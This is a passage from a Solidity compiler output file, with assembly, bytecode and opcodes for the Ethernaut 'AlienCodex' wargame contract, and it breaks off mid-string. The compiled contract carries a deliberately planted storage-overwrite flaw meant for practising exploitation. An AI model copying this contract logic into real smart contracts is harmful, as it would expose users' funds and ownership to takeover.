    0x0100\n      exp\n      dup2\n      sload\n      dup2\n      0xffffffffffffffffffffffffffffffffffffffff\n      mul\n      not\n      and\n      swap1\n      dup4\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      mul\n      or\n      swap1\n      sstore\n      pop\n        /* \"https://github.com/OpenZeppelin/openzeppelin-test-helpers/blob/master/contracts/Ownable.sol\":796:979  function _transferOwnership(address newOwner) internal {... */\n      pop\n      jump\t// out\n        /* \"contracts/Ethernaut/AlienCodex.sol\":165:637  contract AlienCodex is Ownable {\r... */\n    tag_47:\n      dup2\n      sload\n      dup2\n      dup4\n      sstore\n      dup2\n      dup2\n      gt\n      iszero\n      tag_69\n      jumpi\n      dup2\n      dup4\n      0x00\n      mstore\n      keccak256(0x00, 0x20)\n      swap2\n      dup3\n      add\n      swap2\n      add\n      tag_70\n      swap2\n      swap1\n      tag_71\n      jump\t// in\n    tag_70:\n    tag_69:\n      pop\n      pop\n      pop\n      jump\t// out\n    tag_71:\n      tag_72\n      swap2\n      swap1\n    tag_73:\n      dup1\n      dup3\n      gt\n      iszero\n      tag_74\n      jumpi\n      0x00\n      dup2\n      0x00\n      swap1\n      sstore\n      pop\n      0x01\n      add\n      jump(tag_73)\n    tag_74:\n      pop\n      swap1\n      jump\n    tag_72:\n      swap1\n      jump\t// out\n\n    auxdata: 0xa265627a7a72315820330ee8f9b8fd89066ab0e296fab271ecb82d27ff3d2212bde082cdc6e3e3632a64736f6c63430005100032\n}\n",
						"bytecode": {
							"linkReferences": {},
							"object": "6080604052336000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16600073ffffffffffffffffffffffffffffffffffffffff167f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e060405160405180910390a3610620806100cf6000396000f3fe608060405234801561001057600080fd5b506004361061009e5760003560e01c80638da5cb5b116100665780638da5cb5b1461011b5780638f32d59b1461016557806394bd756914610187578063b5c645bd146101c9578063f2fde38b146101f75761009e565b80630339f300146100a357806333a8c45a146100db57806347f57b32146100fd57806358699c5514610107578063715018a614610111575b600080fd5b6100d9600480360360408110156100b957600080fd5b81019080803590602001909291908035906020019092919050505061023b565b005b6100e3610271565b604051808215151515815260200191505060405180910390f35b610105610284565b005b61010f6102b2565b005b6101196102cf565b005b61012361039f565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b61016d6103c8565b604051808215151515815260200191505060405180910390f35b6101b36004803603602081101561019d57600080fd5b810190808035906020019092919050505061041f565b6040518082815260200191505060405180910390f35b6101f5600480360360208110156101df57600080fd5b8101908080359060200190929190505050610440565b005b6102396004803603602081101561020d57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610485565b005b600060149054906101000a900460ff1661025157fe5b806001838154811061025f57fe5b90600052602060002001819055505050565b600060149054906101000a900460ff1681565b600060149054906101000a900460ff1661029a57fe5b60018054809190600190036102af919061059a565b50565b6001600060146101000a81548160ff021916908315150217905550565b6102d76103c8565b6102e057600080fd5b600073ffffffffffffffffffffffffffffffffffffffff166000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff167f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e060405160405180910390a360008060006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550565b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16905090565b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614905090565b6001818154811061042c57fe5b906000526020600020016000915090505481565b600060149054906101000a900460ff1661045657fe5b600181908060018154018082558091505090600182039060005260206000200160009091929091909150555050565b61048d6103c8565b61049657600080fd5b61049f816104a2565b50565b600073ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff1614156104dc57600080fd5b8073ffffffffffffffffffffffffffffffffffffffff166000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff167f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e060405160405180910390a3806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050565b8154818355818111156105c1578183600052602060002091820191016105c091906105c6565b5b505050565b6105e891905b808211156105e45760008160009055506001016105cc565b5090565b9056fea265627a7a72315820330ee8f9b8fd89066ab0e296fab271ecb82d27ff3d2212bde082cdc6e3e3632a64736f6c63430005100032",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLER PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP PUSH1 0x0 DUP1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH32 0x8BE0079C531659141344CD1FD0A4F28419497F9722A3DAAFE3B4186F6B6457E0 PUSH1 0x40 MLOAD PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 PUSH2 0x620 DUP1 PUSH2 0xCF PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x9E JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x8DA5CB5B GT PUSH2 0x66 JUMPI DUP1 PUSH4 0x8DA5CB5B EQ PUSH2 0x11B JUMPI DUP1 PUSH4 0x8F32D59B EQ PUSH2 0x165 JUMPI DUP1 PUSH4 0x94BD7569 EQ PUSH2 0x187 JUMPI DUP1 PUSH4 0xB5C645BD EQ PUSH2 0x1C9 JUMPI DUP1 PUSH4 0xF2FDE38B EQ PUSH2 0x1F7 JUMPI PUSH2 0x9E JUMP JUMPDEST DUP1 PUSH4 0x339F300 EQ PUSH2 0xA3 JUMPI DUP1 PUSH4 0x33A8C45A EQ PUSH2 0xDB JUMPI DUP1 PUSH4 0x47F57B32 EQ PUSH2 0xFD JUMPI DUP1 PUSH4 0x58699C55 EQ PUSH2 0x107 JUMPI DUP1 PUSH4 0x715018A6 EQ PUSH2 0x111 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0xD9 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0xB9 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x23B JUMP JUMPDEST STOP JUMPDEST PUSH2 0xE3 PUSH2 0x271 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 ISZERO ISZERO ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x105 PUSH2 0x284 JUMP JUMPDEST STOP JUMPDEST PUSH2 0x10F PUSH2 0x2B2 JUMP JUMPDEST STOP JUMPDEST PUSH2 0x119 PUSH2 0x2CF JUMP JUMPDEST STOP JUMPDEST PUSH2 0x123 PUSH2 0x39F JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x16D PUSH2 0x3C8 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 ISZERO ISZERO ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x1B3 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x19D JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x41F JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x1F5 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x1DF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x440 JUMP JUMPDEST STOP JUMPDEST PUSH2 0x239 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x20D JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x485 JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 PUSH1 0x14 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0xFF AND PUSH2 0x251 JUMPI INVALID JUMPDEST DUP1 PUSH1 0x1 DUP4 DUP2 SLOAD DUP2 LT PUSH2 0x25F JUMPI INVALID JUMPDEST SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 ADD DUP2 SWAP1 SSTORE POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x14 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0xFF AND DUP2 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x14 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0xFF AND PUSH2 0x29A JUMPI INVALID JUMPDEST PUSH1 0x1 DUP1 SLOAD DUP1 SWAP2 SWAP1 PUSH1 0x1 SWAP1 SUB PUSH2 0x2AF SWAP2 SWAP1 PUSH2 0x59A JUMP JUMPDEST POP JUMP JUMPDEST PUSH1 0x1 PUSH1 0x0 PUSH1 0x14 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH1 0xFF MUL NOT AND SWAP1 DUP4 ISZERO ISZERO MUL OR SWAP1 SSTORE POP JUMP JUMPDEST PUSH2 0x2D7 PUSH2 0x3C8 JUMP JUMPDEST PUSH2 0x2E0 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x0 DUP1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH32 0x8BE0079C531659141344CD1FD0A4F28419497F9722A3DAAFE3B4186F6B6457E0 PUSH1 0x40 MLOAD PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 PUSH1 0x0 DUP1 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x1 DUP2 DUP2 SLOAD DUP2 LT PUSH2 0x42C JUMPI INVALID JUMPDEST SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 ADD PUSH1 0x0 SWAP2 POP SWAP1 POP SLOAD DUP2 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x14 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0xFF AND PUSH2 0x456 JUMPI INVALID JUMPDEST PUSH1 0x1 DUP2 SWAP1 DUP1 PUSH1 0x1 DUP2 SLOAD ADD DUP1 DUP3 SSTORE DUP1 SWAP2 POP POP SWAP1 PUSH1 0x1 DUP3 SUB SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 ADD PUSH1 0x0 SWAP1 SWAP2 SWAP3 SWAP1 SWAP2 SWAP1 SWAP2 POP SSTORE POP POP JUMP JUMPDEST PUSH2 0x48D PUSH2 0x3C8 JUMP JUMPDEST PUSH2 0x496 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x49F DUP2 PUSH2 0x4A2 JUMP JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ ISZERO PUSH2 0x4DC JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x0 DUP1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH32 0x8BE0079C531659141344CD1FD0A4F28419497F9722A3DAAFE3B4186F6B6457E0 PUSH1 0x40 MLOAD PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 DUP1 PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP JUMP JUMPDEST DUP2 SLOAD DUP2 DUP4 SSTORE DUP2 DUP2 GT ISZERO PUSH2 0x5C1 JUMPI DUP2 DUP4 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 SWAP2 DUP3 ADD SWAP2 ADD PUSH2 0x5C0 SWAP2 SWAP1 PUSH2 0x5C6 JUMP JUMPDEST JUMPDEST POP POP POP JUMP JUMPDEST PUSH2 0x5E8 SWAP2 SWAP1 JUMPDEST DUP1 DUP3 GT ISZERO PUSH2 0x5E4 JUMPI PUSH1 0x0 DUP2 PUSH1 0x0 SWAP1 SSTORE POP PUSH1 0x1 ADD PUSH2 0x5CC JUMP JUMPDEST POP SWAP1 JUMP JUMPDEST SWAP1 JUMP INVALID LOG2 PUSH6 0x627A7A723158 KECCAK256 CALLER 0xE 0xE8 0xF9 0xB8 REVERT DUP10 MOD PUSH11 0xB0E296FAB271ECB82D27FF RETURNDATASIZE 0x22 SLT 0xBD 0xE0 DUP3 0xCD 0xC6 0xE3 0xE3 PUSH4 0x2A64736F PUSH13 0x63430005100032000000000000 ",
							"sourceMap": "165:472:0:-;;;210:10:2;201:6;;:19;;;;;;;;;;;;;;;;;;268:6;;;;;;;;;;;235:40;;264:1;235:40;;;;;;;;;;;;165:472:0;;;;;;"
						},
						"deployedBytecode": {
							"linkReferences": {},
							"object": "608060405234801561001057600080fd5b506004361061009e5760003560e01c80638da5cb5b116100665780638da5cb5b1461011b5780638f32d59b1461016557806394bd756914610187578063b5c645bd146101c9578063f2fde38b146101f75761009e565b80630339f300146100a357806333a8c45a146100db57806347f57b32146100fd57806358699c5514610107578063715018a614610111575b600080fd5b6100d9600480360360408110156100b957600080fd5b81019080803590602001909291908035906020019092919050505061023b565b005b6100e3610271565b604051808215151515815260200191505060405180910390f35b610105610284565b005b61010f6102b2565b005b6101196102cf565b005b61012361039f565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b61016d6103c8565b604051808215151515815260200191505060405180910390f35b6101b36004803603602081101561019d57600080fd5b810190808035906020019092919050505061041f565b6040518082815260200191505060405180910390f35b6101f5600480360360208110156101df57600080fd5b8101908080359060200190929190505050610440565b005b6102396004803603602081101561020d57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610485565b005b600060149054906101000a900460ff1661025157fe5b806001838154811061025f57fe5b90600052602060002001819055505050565b600060149054906101000a900460ff1681565b600060149054906101000a900460ff1661029a57fe5b60018054809190600190036102af919061059a565b50565b6001600060146101000a81548160ff021916908315150217905550565b6102d76103c8565b6102e057600080fd5b600073ffffffffffffffffffffffffffffffffffffffff166000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff167f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e060405160405180910390a360008060006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550565b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16905090565b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614905090565b6001818154811061042c57fe5b906000526020600020016000915090505481565b600060149054906101000a900460ff1661045657fe5b600181908060018154018082558091505090600182039060005260206000200160009091929091909150555050565b61048d6103c8565b61049657600080fd5b61049f816104a2565b50565b600073ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff1614156104dc57600080fd5b8073ffffffffffffffffffffffffffffffffffffffff166000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff167f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e060405160405180910390a3806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050565b8154818355818111156105c1578183600052602060002091820191016105c091906105c6565b5b505050565b6105e891905b808211156105e45760008160009055506001016105cc565b5090565b9056fea265627a7a72315820330ee8f9b8fd89066ab0e296fab271ecb82d27ff3d2212bde082cdc6e3e3632a64736f6c63430005100032",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x9E JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x8DA5CB5B GT PUSH2 0x66 JUMPI DUP1 PUSH4 0x8DA5CB5B EQ PUSH2 0x11B JUMPI DUP1 PUSH4 0x8F32D59B EQ PUSH2 0x165 JUMPI DUP1 PUSH4 0x94BD7569 EQ PUSH2 0x187 JUMPI DUP1 PUSH4 0xB5C645BD EQ PUSH2 0x1C9 JUMPI DUP1 PUSH4 0xF2FDE38B EQ PUSH2 0x1F7 JUMPI PUSH2 0x9E JUMP JUMPDEST DUP1 PUSH4 0x339F300 EQ PUSH2 0xA3 JUMPI DUP1 PUSH4 0x33A8C45A EQ PUSH2 0xDB JUMPI DUP1 PUSH4 0x47F57B32 EQ PUSH2 0xFD JUMPI DUP1 PUSH4 0x58699C55 EQ PUSH2 0x107 JUMPI DUP1 PUSH4 0x715018A6 EQ PUSH2 0x111 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0xD9 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0xB9 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x23B JUMP JUMPDEST STOP JUMPDEST PUSH2 0xE3 PUSH2 0x271 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 ISZERO ISZERO ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x105 PUSH2 0x284 JUMP JUMPDEST STOP JUMPDEST PUSH2 0x10F PUSH2 0x2B2 JUMP JUMPDEST STOP JUMPDEST PUSH2 0x119 PUSH2 0x2CF JUMP JUMPDEST STOP JUMPDEST PUSH2 0x123 PUSH2 0x39F JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x16D PUSH2 0x3C8 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 ISZERO ISZERO ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x1B3 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x19D JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x41F JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x1F5 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x1DF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x440 JUMP JUMPDEST STOP JUMPDEST PUSH2 0x239 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x20D JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x485 JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 PUSH1 0x14 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0xFF AND PUSH2 0x251 JUMPI INVALID JUMPDEST DUP1 PUSH1 0x1 DUP4 DUP2 SLOAD DUP2 LT PUSH2 0x25F JUMPI INVALID JUMPDEST SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 ADD DUP2 SWAP1 SSTORE POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x14 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0xFF AND DUP2 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x14 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0xFF AND PUSH2 0x29A JUMPI INVALID JUMPDEST PUSH1 0x1 DUP1 SLOAD DUP1 SWAP2 SWAP1 PUSH1 0x1 SWAP1 SUB PUSH2 0x2AF SWAP2 SWAP1 PUSH2 0x59A JUMP JUMPDEST POP JUMP JUMPDEST PUSH1 0x1 PUSH1 0x0 PUSH1 0x14 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH1 0xFF MUL NOT AND SWAP1 DUP4 ISZERO ISZERO MUL OR SWAP1 SSTORE POP JUMP JUMPDEST PUSH2 0x2D7 PUSH2 0x3C8 JUMP JUMPDEST PUSH2 0x2E0 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x0 DUP1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH32 0x8BE0079C531659141344CD1FD0A4F28419497F9722A3DAAFE3B4186F6B6457E0 PUSH1 0x40 MLOAD PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 PUSH1 0x0 DUP1 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x1 DUP2 DUP2 SLOAD DUP2 LT PUSH2 0x42C JUMPI INVALID JUMPDEST SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 ADD PUSH1 0x0 SWAP2 POP SWAP1 POP SLOAD DUP2 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x14 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0xFF AND PUSH2 0x456 JUMPI INVALID JUMPDEST PUSH1 0x1 DUP2 SWAP1 DUP1 PUSH1 0x1 DUP2 SLOAD ADD DUP1 DUP3 SSTORE DUP1 SWAP2 POP POP SWAP1 PUSH1 0x1 DUP3 SUB SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 ADD PUSH1 0x0 SWAP1 SWAP2 SWAP3 SWAP1 SWAP2 SWAP1 SWAP2 POP SSTORE POP POP JUMP JUMPDEST PUSH2 0x48D PUSH2 0x3C8 JUMP JUMPDEST PUSH2 0x496 JUMPI PUSH1 0x0 DUP1 REVERT 